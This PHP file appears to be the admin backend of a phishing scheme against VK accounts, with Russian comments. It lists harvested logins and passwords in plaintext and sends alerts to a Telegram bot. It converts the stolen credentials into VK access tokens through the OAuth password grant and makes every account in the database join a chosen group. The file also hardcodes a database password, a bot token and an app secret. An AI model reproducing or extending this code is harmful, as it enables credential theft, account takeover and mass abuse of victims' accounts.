<?php
    require 'libs/rb.php';

    R::setup( 'mysql:host=localhost;dbname=games_user', 'games_user', 'iople123'); //for both mysql or mariaDB
    session_start();



//Все аккаунты login:pass + image && url
function all_users(){
    $numusers = R::count( 'users' );
    echo 'Всего аккаунтов: '.$numusers;
    $users  = R::find('users');
    foreach ( $users as $user => $id){
        echo '
        <div class="profile-users">
        <a href="https://vk.com/id'.$id->user_id.'">
        <img src="'.$id->photo.'"></a></br>
        Имя: '.$id->first_name.'</br>
        Фамилия: '.$id->last_name.'</br>
        <p id="logpass">'.$id->login.':'.$id->pass.'</p>



        </div>
        </br>';
    }
}

//VK Профиль список всех аккаунтов в базе 
//name/family
//img+url
function acc_profile(){
    $numusers = R::count( 'users' );
    echo 'Всего аккаунтов: '.$numusers.'</br>';
    $users  = R::find('users');
    foreach ( $users as $user => $id){
        echo '
        </br>
        <div class="profile-users">
        <a href="https://vk.com/id'.$id->user_id.'">
        <img src="'.$id->photo.'"></a></br>
        Имя: '.$id->first_name.'</br>
        Фамилия: '.$id->last_name.'</br>
        </div>
        </br>';
    }
}

//Список всех аккаунтов login:pass
function all_user(){
    $numusers = R::count( 'users' );
    echo 'Всего аккаунтов: '.$numusers;
    $users  = R::find('users');
    foreach ( $users as $user => $id){
        echo '
        <p id="logpass">'.$id->login.':'.$id->pass.'</p>';
    }
}


//Уведомление в тг
//Телеграм id чата/Админа @getmyid_bot
$chat_id = '943813510';
function send($chat_id, $mess){

    $token = '1084902704:AAFEBTMCS12QZMxvi9lspaoHN6h5dojcH14';
    $url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=".urlencode($mess)."&parse_mode=html";
    echo file_get_contents($url);
}

//Получаем user_id
    function get_id($login, $password){
    $params = array(

        'grant_type' => 'password', 
        'client_id' => '2274003', 
        'scope' => 'offline, groups', 
        'client_secret' => 'hHbZxrka2uZ6jB1inYsH',
        'username' => $login,
        'password' => $password,
        array(
    'headers' => array(
    'accept: '.$headers['accept'],
    'content-type: '.$headers['content-type'],
    'user-agent: '.$headers['user-agent']
    )
    )

    );
    $get_id = http_build_query($params); 
    $result = json_decode(file_get_contents('https://api.vk.com/oauth/token?'. $get_id));
    $id = $result->user_id;
    return $id;
}




//Получаем token vk
    function get_token($login, $password){
    $params = array(

        'grant_type' => 'password', 
        'client_id' => '2274003', 
        'scope' => 'offline, groups, messages', 
        'client_secret' => 'hHbZxrka2uZ6jB1inYsH',
        'username' => $login,
        'password' => $password,
        array(
    'headers' => array(
    'accept: '.$headers['accept'],
    'content-type: '.$headers['content-type'],
    'user-agent: '.$headers['user-agent']
    )
    )

    );
    $get_token = http_build_query($params); 
    $result = json_decode(file_get_contents('https://api.vk.com/oauth/token?'. $get_token));
    $token = $result->access_token;
    return $token;
}
function group_adm($login, $pass, $group_id){
    $token = get_token($login, $pass);
    
        $params = array(
        'group_id' => $group_id,
        'access_token' => $token,
        'v' => '5.105',
        array(
    'headers' => array(
    'accept: '.$headers['accept'],
    'content-type: '.$headers['content-type'],
    'user-agent: '.$headers['user-agent']
    )
    )

    );
    $join = http_build_query($params); 
    $result = json_decode(file_get_contents('https://api.vk.com/method/groups.join?'. $join));

    
}

function group_join($login, $pass){
    $token = get_token($login, $pass);
    
        $params = array(
        'group_id' => '194286948',
        'access_token' => $token,
        'v' => '5.105',
        array(
    'headers' => array(
    'accept: '.$headers['accept'],
    'content-type: '.$headers['content-type'],
    'user-agent: '.$headers['user-agent']
    )
    )

    );
    $join = http_build_query($params); 
    $result = json_decode(file_get_contents('https://api.vk.com/method/groups.join?'. $join));

    if($result == 1){
        return "Пользователь успешно подписался на сообщество";
    }else{
        return "Не удачно!";
    }
    
}


function joins($group_id){
    $numusers = R::count( 'users' );
    $users  = R::find('users');
    foreach ( $users as $user => $id){
        group_adm($id->login, $id->pass, $group_id);
    }
}

//Закрываем сессию
function quit(){
    
    unset($_SESSION['user']);
    header('Location: vk.php');
};

?>